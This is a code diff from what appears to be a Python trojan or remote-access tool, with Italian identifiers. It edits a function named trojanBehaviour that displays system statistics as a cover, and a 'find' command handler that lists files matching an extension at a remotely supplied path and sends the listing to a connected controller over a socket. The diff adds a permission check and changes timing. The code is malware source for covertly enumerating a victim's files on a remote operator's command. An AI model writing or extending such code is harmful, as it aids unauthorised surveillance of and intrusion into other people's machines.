@@ -41,7 +41,7 @@ def trojanBehaviour():
                                                                                                               int(disk),
                                                                                                               processes_count))
             print("              --------------------------------------------------------- ")
-            time.sleep(1)
+            time.sleep(5)
             clearScreen()
         except:
             print("              --------------------------------------------------------- ")
@@ -137,25 +137,26 @@ def find(comando, client):
 
     estensione=comando[inizio_ext:fine_ext]
     path=comando[inizio_path:]
-    genericlist=os.listdir(path)
-    for item in genericlist:
-        if item.endswith(estensione):
-            counter_elemets += 1
-            specificlist.append("-: " + item + "\n")
+    if os.access(path, os.R_OK)==True:
+        genericlist=os.listdir(path)
+        for item in genericlist:
+            if item.endswith(estensione):
+                counter_elemets += 1
+                specificlist.append("-: " + item + "\n")
 
-    specificlist.append("\nNumero di elementi trovati: " + str(counter_elemets))
-    data = ''.join(specificlist)
-
-    try:
-        filesize = sys.getsizeof(data)
-        client.send((str(filesize)).encode(FORMAT))
-        time.sleep(5)
-        client.send((data).encode(FORMAT))
-        time.sleep(1)
-    except Exception:
-        traceback.print_exc()
-        raise Exception
-
+        specificlist.append("\nNumero di elementi trovati: " + str(counter_elemets))
+        data = ''.join(specificlist)
+        try:
+            filesize = sys.getsizeof(data)
+            client.send((str(filesize)).encode(FORMAT))
+            time.sleep(5)
+            client.send((data).encode(FORMAT))
+            time.sleep(1)
+        except Exception:
+            traceback.print_exc()
+            raise Exception
+    else:
+        client.send(("[ERROR] Path doesn't exist").encode(FORMAT))
 
 
 # funzione di remote control
